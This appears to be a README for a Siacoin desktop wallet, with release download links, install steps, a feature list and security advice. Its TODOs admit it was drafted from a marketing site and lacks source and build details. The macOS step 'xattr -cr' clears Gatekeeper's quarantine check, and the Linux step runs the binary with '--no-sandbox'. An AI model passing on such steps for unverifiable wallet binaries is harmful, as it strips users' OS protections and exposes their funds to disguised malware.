<div align="center">

# Sia Wallet

**A non-custodial desktop wallet for Siacoin (SC) and Siafunds (SF) — lite-mode by default, built-in legacy seed migration, and native Ledger support.**

[Releases](https://github.com/Sia-Developments/SiaWallet/releases) · [Report an issue](https://github.com/Sia-Developments/SiaWallet/issues)

![Version](https://img.shields.io/badge/version-v2.12.0-blue) ![License](https://img.shields.io/badge/license-MIT-green) ![Platforms](https://img.shields.io/badge/platforms-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)

</div>

---

## Downloads

[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D6?logo=windows&logoColor=white)](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?logo=apple&logoColor=white)](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-FCC624?logo=linux&logoColor=black)](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.zip)

| Platform | File | Requires |
|---|---|---|
| Windows | [siawallet-2.12.0.exe](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.exe) | Windows 10+ (64-bit) |
| macOS | [siawallet-2.12.0.dmg](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.dmg) | macOS 11+ (Apple Silicon + Intel) |
| Linux | [siawallet-2.12.0.zip](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.zip) | Ubuntu 20.04+, Fedora 35+, Arch (x86_64 AppImage) |

See [Releases](https://github.com/Sia-Developments/SiaWallet/releases) for all versions and checksums. <!-- TODO: link to RELEASES.md once that file exists in-repo -->

---

## Install

### Windows

```
1. Download siawallet-2.12.0.exe
2. Run the installer
3. Launch Sia Wallet from the Start menu
```

### macOS

```
1. Open siawallet-2.12.0.dmg
2. Drag Sia Wallet to Applications
```

If Gatekeeper blocks the app on first launch:

```bash
xattr -cr /Applications/Sia\ Wallet.app
```

### Linux

```bash
unzip siawallet-2.12.0.zip
chmod +x siawallet-2.12.0.AppImage
./siawallet-2.12.0.AppImage
```

If the AppImage fails to launch in a sandboxed environment:

```bash
./siawallet-2.12.0.AppImage --no-sandbox
```

---

## Features

- Default lite-mode sync — no 256 GB blockchain download; full-node mode is a single toggle in Advanced Settings
- Built-in legacy seed migration assistant — 28/29-word Sia-UI seeds → 12-word BIP39, seeds never leave the local machine
- Native Ledger Nano S / Nano S Plus / Nano X support over USB and Bluetooth — no experimental browser flags
- Guided four-step first-run wizard with 12-word BIP39 seed generation and confirmation
- Watch-only accounts and cold-storage seed generation (`--cold` mode, air-gapped)
- Air-gapped signing workflow — export unsigned transactions, sign offline, reimport for broadcast
- Tor routing via a user-provided local SOCKS5 proxy
- Zero telemetry by default; opt-in crash reporter with plain-English consent
- Fee estimator (Fast / Standard / Economy) with SC and USD equivalents
- Dark mode (system-aware, manual, or time-of-day)
- Optional SC/USD price display via the CoinGecko public API
- Custom data directory support
- Multi-wallet JSON API and Docker deployment preserved from walletd (Advanced Settings)

---

## Modes

| Mode | Description |
|---|---|
| Lite-mode (default) | Queries a pinned list of verified Sia consensus nodes over authenticated TLS. First-run to first receivable address in under 60 seconds. |
| Full-node | Downloads and validates the full Sia blockchain (~256 GB). Enabled with a single toggle in Advanced Settings. |

Targets the Sia network post-[v2 hardfork](https://github.com/Sia-Developments/SiaWallet) (activated June 6, 2025) and post-Final Cut (December 2, 2025) — full v2 consensus support.

---

## Where things live

<!-- TODO: needs real default paths (config/data/logs/backup) per OS from the app source — not documented on the marketing site. See note below. -->

---

## ⚠️ Security

**Your 12-word seed is the only way to recover your wallet. Sia Wallet cannot reset your password or recover a lost seed — no self-custody wallet can.** Back up your seed in two physical locations before funding the wallet.

- Paid "seed recovery" services are scams — do not use them.
- Legacy 28/29-word Sia-UI seeds are still valid for deriving old addresses but must be migrated to the 12-word BIP39 format (built-in migration assistant, first run) before they can transact on the post-v2 network.
- Private keys generated locally never leave your machine unless you explicitly export them (air-gapped signing) or use a connected Ledger, where keys never leave the hardware device.

---

## Development

<!-- TODO: needs real prerequisites, clone/install, run, per-platform build, lint/format, and release-cutting steps from the app repo. Not present in the marketing site source used to draft this README. -->

---

## Stack

<!-- TODO: needs confirmation of the actual core frameworks (e.g. Go for the walletd-derived core, plus whatever the desktop GUI layer is) before listing linked bullet points. -->

---

## Support

Issues and feature requests: [github.com/Sia-Developments/SiaWallet/issues](https://github.com/Sia-Developments/SiaWallet/issues)

## License

[MIT](https://github.com/Sia-Developments/SiaWallet/blob/main/LICENSE)
